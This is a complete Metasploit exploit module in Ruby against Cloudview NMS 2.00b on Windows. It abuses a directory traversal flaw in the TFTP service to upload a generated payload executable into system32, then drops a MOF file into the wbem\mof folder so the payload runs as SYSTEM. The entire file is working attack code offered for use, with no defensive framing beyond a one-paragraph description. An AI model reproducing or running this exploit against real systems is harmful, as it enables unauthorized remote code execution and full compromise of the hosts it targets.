require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Rex::Proto::TFTP
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cloudview NMS 2.00b Writable Directory Traversal Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Cloudview NMS server.  The
        software contains a directory traversal vulnerability that allows a remote
        attacker to write arbitrary file to the file system, which results in
        code execution under the context 'SYSTEM'.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'james fitts' ],
      'References'     =>
        [
          ['URL', '0day']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "none"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ ' Cloudview NMS 2.00b on Windows', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 13 2014",
      'DefaultTarget'  => 0))

    register_options([
      OptInt.new('DEPTH', [ false, "Levels to reach base directory", 5 ]),
      OptAddress.new('RHOST', [ true, "The remote TFTP server address" ]),
      OptPort.new('RPORT', [ true, "The remote TFTP server port", 69 ])
    ], self.class)
  end

	def upload(filename, data)
		tftp_client = Rex::Proto::TFTP::Client.new(
			"LocalHost"  => "0.0.0.0",
			"LocalPort"  => 1025 + rand(0xffff-1025),
			"PeerHost"   => datastore['RHOST'],
			"PeerPort"   => datastore['RPORT'],
			"LocalFile"  => "DATA:#{data}",
			"RemoteFile" => filename,
			"Mode"       => "octet",
			"Context"    => {'Msf' => self.framework, "MsfExploit" => self },
			"Action"     => :upload
		)

		ret = tftp_client.send_write_request { |msg| print_status(msg) }
		while not tftp_client.complete
			select(nil, nil, nil, 1)
			tftp_client.stop
		end
	end

	def exploit
		peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"

		exe_name = rand_text_alpha(rand(10)+5) + '.exe'
		exe      = generate_payload_exe
		mof_name = rand_text_alpha(rand(10)+5) + '.mof'
		mof      = generate_mof(mof_name, exe_name)

		depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
		levels = "../" * depth

		print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
		upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)

		select(nil, nil, nil, 1)

		print_status("#{peer} - Uploading .mof...")
		upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
	end
end
